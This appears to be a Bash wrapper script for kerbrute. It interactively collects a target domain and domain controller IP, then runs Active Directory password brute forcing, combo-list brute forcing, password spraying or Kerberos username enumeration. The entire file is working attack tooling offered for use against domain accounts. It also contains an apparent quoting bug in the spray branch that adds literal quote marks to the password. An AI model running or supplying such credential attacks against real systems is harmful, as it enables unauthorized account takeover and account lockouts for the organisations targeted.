#!/bin/bash

line="\n============================================================\n"
cred="'"

echo -e "$line\nSelect the operation to perform:\n[1] bruteuser - Bruteforce a single user's password from a wordlist\n[2] bruteforce - Read username:password combos from a file\n[3] passwordspray - Test a single password against a list of users\n[4] userenum - Enumerate valid domain usernames via Kerberos\n\n[!] Tip: Kerbrute can lockout accounts if that setting is enabled\n"
read mode

echo -e "\nSpecify the domain (e.g. xample.local):\n"
read dom

echo -e "\nSpecify the Domain Controller's IP Address:\n"
read dc

if [ $mode == 1 ]
then
	echo -e "\nEnter the file path for the password wordlist:\n"
	read passwd
	echo -e "\nEnter the username to Bruteforce\n"
	read user

	set -x
	kerbrute bruteuser -d $dom --dc $dc $passwd $user
	set +x

elif [ $mode == 2 ]
then
	echo -e "\nEnter the file path for the credential wordlist (The format is username:password):\n"
	read passwd

	set -x
	kerbrute bruteforce -d $dom --dc $dc $passwd
	set +x

elif [ $mode == 3 ]
then
	echo -e "\nSpecify the password to spray:\n"
	read passwd
	cred+="$passwd"; cred+="'"
	echo -e "\nSpecify the file path to the username wordlist:\n"
	read user

	set -x
	kerbrute passwordspray -d $dom --dc $dc $user $cred
	set +x

elif [ $mode == 4 ]
then
	echo -e "\nSpecify the file path to the username wordlist:\n"
	read user

	set -x
	kerbrute userenum -d $dom --dc $dc $user
	set +x

else
	echo -e "\nYou did not select a valid option\n"
fi
echo -e "$line"
